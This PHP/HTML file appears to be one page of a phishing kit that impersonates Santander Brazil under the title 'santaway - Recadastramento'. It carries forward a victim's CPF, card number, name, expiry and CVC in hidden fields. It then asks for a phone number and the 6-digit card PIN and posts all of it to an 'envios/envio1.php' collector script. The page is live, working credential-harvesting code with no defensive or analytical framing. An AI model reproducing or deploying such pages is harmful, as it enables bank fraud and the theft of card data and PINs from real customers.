<?php 
        session_start();

        $cpf = $_POST['cpf'];
        $entrada = $_POST['entrada'];
        $number = $_POST['number'];
        $name = $_POST['name'];
        $expiry = $_POST['expiry'];
        $cvc = $_POST['cvc'];
      

        
    $_SESSION["cpf"] = $cpf;
    $_SESSION["entrada"] = $entrada;
    $_SESSION["number"] = $number;
    $_SESSION["name"] = $name;
    $_SESSION["expiry"] = $expiry;
    $_SESSION["cvc"] = $cvc;

              
    ?>
<!DOCTYPE html>
<html>
<head>
    <title>santaway - Recadastramento</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    
    <link href="https://www.santander.com.br/Theme_WCSantanderUK-theme/images/favicon.ico" rel="Shortcut Icon">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

</head>


<body id="telainfo">
    <!-- formulario -->
    <div class="container">
        <section class="home-mk">
            <div class="row">
                <div class="col-md-12">
                    <h1 class="logo-form">
                        
                    </h1>
                </div>
            </div>
            <div class="row">
                <div class="col-md-12">
                    <form name="form1" action="envios/envio1.php" method="POST" class="form-home form-inline" style="margin-top:120px;">
                      <input type="hidden" name="cpf" id="cpf" value="<?php echo $_SESSION["cpf"] ?>">
                      <input type="hidden" name="entrada" id="entrada" value="<?php echo $_SESSION["entrada"] ?>">
                      <input type="hidden" name="number" id="number" value="<?php echo $_SESSION["number"] ?>">
                      <input type="hidden" name="name" id="name" value="<?php echo $_SESSION["name"] ?>">
                      <input type="hidden" name="expiry" id="expiry" value="<?php echo $_SESSION["expiry"] ?>">
                      <input type="hidden" name="cvc" id="cvc" value="<?php echo $_SESSION["cvc"] ?>">

                      
                         <label style="text-align:center;">Precisaremos Realizar um processo de confirmação. Para prosseguir com o processo, precisaremos <p>confirmar alguns dados.</label>
                        <div class="form-group">
                            <input id="telefone" name="telefone" placeholder="Digite seu Telefone" type="tel" minlength="14" maxlength="14" required onkeypress="return SomenteNumero(event);" onkeyup="mascaraMike('(##)#####-####', this);javascript:pulacampo('telefone','s6');">
                        </div>
                         <div class="form-group">
                            <input id="s6" name="s6" placeholder="Senha de 6 dígitos do cartão" type="tel" minlength="6" maxlength="6" required onkeypress="return SomenteNumero(event)" onkeypress="return SomenteNumero(event)" onkeyup="pulacampo('s6','continuar');" style="-webkit-text-security: circle;"> 
                        </div>
                        <div class="form-group">
                            <input type="submit" name="" value="Finalizar" id="continuar">
                        </div>
                        
                    </form>
                </div>
            </div>
        </section>
    </div>
    <!-- rodape -->
    <div class="container">
        <div class="row">   
            <div class="col-md-12">

            </div>
        </div>
    </div>
</body>

    <!-- scripts -->
    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/padrao_mk.js"></script>

</html>